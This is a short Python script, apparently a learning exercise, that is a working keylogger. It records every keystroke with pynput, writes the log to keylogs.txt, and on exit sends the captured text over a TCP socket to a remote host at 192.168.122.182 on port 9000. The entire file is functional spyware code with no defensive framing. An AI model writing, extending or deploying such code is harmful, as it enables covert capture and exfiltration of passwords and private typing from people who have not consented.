import pynput.keyboard
import socket
import os

log = ""

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log += " "
        else:
            log += str(key)
    print(f"Key pressed: {key}")

def send_logs():
    global log
    server_ip = "192.168.122.182"
    port = 9000
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((server_ip, port))
            s.sendall(log.encode())
            print("Logs sent to server.")
        except Exception as e:
            print(f"Failed to send logs: {e}")

def write_file():
    global log
    with open("keylogs.txt", "a") as f:
        f.write(log)
    print("Logs written to file.")

with pynput.keyboard.Listener(on_press=on_press) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        pass
    finally:
        write_file()
        send_logs()